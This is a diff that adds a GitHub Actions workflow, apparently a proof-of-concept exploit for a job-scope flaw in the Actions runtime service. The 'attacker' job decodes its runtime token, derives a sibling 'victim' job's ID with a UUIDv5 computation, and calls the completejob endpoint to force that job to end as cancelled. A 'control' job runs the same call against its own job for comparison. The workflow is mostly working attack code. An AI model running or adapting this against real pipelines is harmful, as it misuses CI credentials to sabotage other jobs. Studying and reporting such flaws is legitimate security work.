@@ -1,0 +1,56 @@
+name: Runner job scope differential
+on:
+  workflow_dispatch:
+jobs:
+  victim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Victim stays live
+        uses: actions/github-script@v7
+        with:
+          script: |
+            core.info(`victim runtime token present=${!!process.env.ACTIONS_RUNTIME_TOKEN}`)
+            for (let i = 0; i < 18; i++) {
+              core.info(`victim heartbeat ${i}`)
+              await new Promise(r => setTimeout(r, 10000))
+            }
+  control:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Own-job completejob positive control
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const token = process.env.ACTIONS_RUNTIME_TOKEN || ''
+            const url = process.env.ACTIONS_RUNTIME_URL || ''
+            const p = token.split('.')[1].replace(/-/g,'+').replace(/_/g,'/')
+            const claims = JSON.parse(Buffer.from(p, 'base64').toString('utf8'))
+            const payload = {planId: claims.plan_id, jobId: claims.job_id, conclusion: 0, outputs:{}, stepResults:[], annotations:[], telemetry:[]}
+            const res = await fetch(new URL('completejob', url), {method:'POST', headers:{Authorization:`Bearer ${token}`,'Content-Type':'application/json'}, body:JSON.stringify(payload)})
+            const body = await res.text()
+            core.info(`CONTROL own completejob status=${res.status} body=${body.slice(0,300)}`)
+  attacker:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Sibling-job completejob attack
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const crypto = require('crypto')
+            const token = process.env.ACTIONS_RUNTIME_TOKEN || ''
+            const url = process.env.ACTIONS_RUNTIME_URL || ''
+            const p = token.split('.')[1].replace(/-/g,'+').replace(/_/g,'/')
+            const claims = JSON.parse(Buffer.from(p, 'base64').toString('utf8'))
+            function uuidBytes(u){ return Buffer.from(u.replace(/-/g,''),'hex') }
+            function uuid5(namespace,name){
+              const h=crypto.createHash('sha1').update(Buffer.concat([uuidBytes(namespace),Buffer.from(name)])).digest().subarray(0,16)
+              h[6]=(h[6]&0x0f)|0x50; h[8]=(h[8]&0x3f)|0x80
+              const x=h.toString('hex'); return `${x.slice(0,8)}-${x.slice(8,12)}-${x.slice(12,16)}-${x.slice(16,20)}-${x.slice(20)}`
+            }
+            const victimId=uuid5(claims.plan_id,'victim.__default')
+            core.info(`attacker own job=${claims.job_id} predicted victim=${victimId}`)
+            await new Promise(r => setTimeout(r, 20000))
+            const payload = {planId: claims.plan_id, jobId: victimId, conclusion: 3, outputs:{}, stepResults:[], annotations:[], telemetry:[]}
+            const res = await fetch(new URL('completejob', url), {method:'POST', headers:{Authorization:`Bearer ${token}`,'Content-Type':'application/json'}, body:JSON.stringify(payload)})
+            const body = await res.text()
+            core.info(`ATTACK sibling completejob status=${res.status} body=${body.slice(0,300)}`)
